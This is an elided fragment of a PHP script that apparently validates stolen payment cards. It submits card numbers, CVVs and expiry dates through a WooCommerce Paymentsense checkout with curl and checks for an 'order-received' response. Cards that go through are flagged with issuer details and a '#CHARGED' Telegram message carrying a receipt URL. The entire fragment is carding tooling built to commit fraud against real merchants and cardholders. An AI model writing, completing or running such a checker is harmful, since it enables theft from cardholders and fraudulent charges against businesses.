...
$paymentMethods = [
    ...
    'paymentsense_direct' => '/<input[^>]*name="payment_method"[^>]*value="paymentsense_direct"/'
];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'billing_phone' => $phone,
    'billing_email' => $email,
    'date_of_birth' => 'May 14, 2025',
    'delivery_time' => '31/05/2025',
    ...
    'psense_ccname' => 'Mit Sui',
    'psense_ccnum' => $cc,
    'psense_cv2' =>  $cvv,
    'psense_expmonth' => $mes1,
    'psense_expyear' => $ano_no_20,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED PAYMENTSENSE]
    \n[$hostname1]
    \n[$receiptUrl]\n";
